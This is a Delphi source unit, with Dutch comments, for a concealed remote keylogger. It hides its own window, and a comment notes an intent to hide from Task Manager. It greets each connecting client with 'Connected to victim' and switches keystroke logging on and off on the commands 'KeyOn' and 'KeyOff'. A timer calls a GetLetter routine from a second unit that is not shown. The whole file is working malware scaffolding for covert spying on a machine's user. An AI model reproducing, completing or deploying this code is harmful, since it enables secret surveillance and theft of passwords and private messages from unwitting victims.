unit Unit1;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ExtCtrls, ScktComp;

type
  TForm1 = class(TForm)
    ServerLogger: TServerSocket;
    TmrLogger: TTimer;
    ServerSocket1: TServerSocket;
    procedure ServerLoggerAccept(Sender: TObject;
      Socket: TCustomWinSocket);
    procedure ServerLoggerClientDisconnect(Sender: TObject;
      Socket: TCustomWinSocket);
    procedure ServerLoggerClientError(Sender: TObject;
      Socket: TCustomWinSocket; ErrorEvent: TErrorEvent;
      var ErrorCode: Integer);
    procedure TmrLoggerTimer(Sender: TObject);
    procedure ServerSocket1ClientConnect(Sender: TObject;
      Socket: TCustomWinSocket);
    procedure ServerSocket1ClientRead(Sender: TObject;
      Socket: TCustomWinSocket);
    procedure FormCreate(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form1: TForm1;

implementation

uses unit2;

{$R *.dfm}

procedure TForm1.FormCreate(Sender: TObject);
begin
// applicatie verbergen
SetWindowLong(Application.Handle,GWL_EXSTYLE,WS_EX_TOOLWINDOW);
ShowWindow(Application.Handle, SW_HIDE);
SetWindowLong( Handle,
GWL_STYLE,
GetWindowLong( Handle, GWL_STYLE )
and not WS_CAPTION );

// Verbergen uit taakbeheer



end;

procedure TForm1.ServerLoggerAccept(Sender: TObject;
  Socket: TCustomWinSocket);
begin
TmrLogger.Enabled:=True;
end;

procedure TForm1.ServerLoggerClientDisconnect(Sender: TObject;
  Socket: TCustomWinSocket);
begin
     if ServerLogger.Socket.ActiveConnections = 0 then
      TmrLogger.Enabled:=False;
end;

procedure TForm1.ServerLoggerClientError(Sender: TObject;
  Socket: TCustomWinSocket; ErrorEvent: TErrorEvent;
  var ErrorCode: Integer);
begin
ErrorCode:=0;
end;

procedure TForm1.TmrLoggerTimer(Sender: TObject);
begin
GetLetter;
end;

procedure TForm1.ServerSocket1ClientConnect(Sender: TObject;
  Socket: TCustomWinSocket);
begin
Socket.SendText('Verbonden met slachtoffer.');
end;

procedure TForm1.ServerSocket1ClientRead(Sender: TObject;
  Socket: TCustomWinSocket);
 var
 Blah : String;
begin
 blah := Socket.ReceiveText;
 if blah = 'KeyOn' then begin
 ServerLogger.Open;
 end;
 if blah = 'KeyOff' then begin
 ServerLogger.Close;
 end;
end;

end.
